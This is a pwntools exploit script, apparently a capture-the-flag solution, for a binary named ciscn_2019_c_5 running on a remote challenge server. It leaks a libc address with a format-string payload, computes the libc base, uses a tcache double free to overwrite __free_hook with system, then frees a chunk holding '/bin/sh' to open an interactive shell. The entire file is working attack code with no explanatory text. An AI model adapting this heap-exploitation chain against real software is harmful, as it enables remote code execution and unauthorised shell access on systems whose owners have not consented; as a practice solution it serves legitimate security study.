from pwn import *
filename="./ciscn_2019_c_5"
libc_name="./libc-2.27.so"
# io = process(filename)
io = remote("node4.buuoj.cn",29290)
context.log_level='debug'
elf=ELF(filename)
libc=ELF(libc_name)
context.terminal=['tmux','split','-hp','60']

def add(size,content):
    io.recvuntil('choice:')
    io.sendline('1')
    io.recvuntil('story: ')
    io.sendline(str(size))
    io.recvuntil('story: ')
    io.sendline(content)

def delete(index):
    io.recvuntil('choice:')
    io.sendline('4')
    io.recvuntil('index:')
    io.sendline(str(index))

def show():
    io.recvuntil('choice:')
    io.sendline('3')

def debug():
    gdb.attach(io,"brva 0xD0C")
    show()


io.recvuntil('name?')
io.sendline("%p.%p.%p.%p.%p.%p.%p.%p.%p.%p")
io.recvuntil(".")
libc_info = int(io.recvuntil('.',drop=True),16)
success("libc_info: " + hex(libc_info))
io.recvuntil('lease input your ID.\n')
io.sendline('aa')
libc_base = libc_info - 0x110081
success("libc_base: " + hex(libc_base))

add(0x30,"aa") #0
add(0x30,"aa") #1
add(0x30,"aa") #2
delete(0)
delete(0)
add(0x30,p64(libc_base+libc.symbols['__free_hook'])) #3
add(0x30,"/bin/sh\x00") #4
add(0x30,p64(libc_base + libc.symbols['system']))
# debug()
delete(4)




io.interactive()
